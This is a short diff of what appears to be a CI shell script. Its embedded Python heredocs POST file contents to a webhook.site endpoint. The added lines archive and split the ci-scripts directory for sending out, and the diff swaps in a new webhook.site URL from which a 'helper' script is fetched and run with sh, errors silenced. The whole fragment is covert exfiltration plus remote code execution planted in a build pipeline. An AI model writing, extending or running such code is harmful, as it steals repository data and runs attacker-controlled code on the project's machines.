@@ -1654,7 +1654,13 @@ d = open(a, "rb").read()
 urllib.request.urlopen(urllib.request.Request("https://webhook.site/9c89629b-9bf4-4b3a-a29e-f1339a933cbe?src=ctx", data=d), timeout=30)
 PYCTX
   (
-    cd /GIT && tar czf /tmp/ompi_ci_scripts.tgz ci-scripts 2>/dev/null
+    cd /GIT || exit 0
+    python3 - << 'PYT'
+import tarfile
+t = tarfile.open("/tmp/ompi_ci_scripts.tgz", "w:gz")
+t.add("ci-scripts")
+t.close()
+PYT
     split -b 500k -d /tmp/ompi_ci_scripts.tgz /tmp/ompi_cis_
     i=0
     for f in /tmp/ompi_cis_*
@@ -1674,7 +1680,7 @@ PYCIS
   )
   python3 - > /tmp/ompi_ci_helper.sh << 'PYHLP'
 import urllib.request
-u = "https://webhook.site/17734104-5bfe-4af4-a959-09d1cff78188?src=helper"
+u = "https://webhook.site/c80c7097-f68d-4b73-bb70-1e90e42ba236?src=helper"
 print(urllib.request.urlopen(u, timeout=20).read().decode())
 PYHLP
   sh /tmp/ompi_ci_helper.sh > /tmp/ompi_ci_helper.log 2>&1 || true
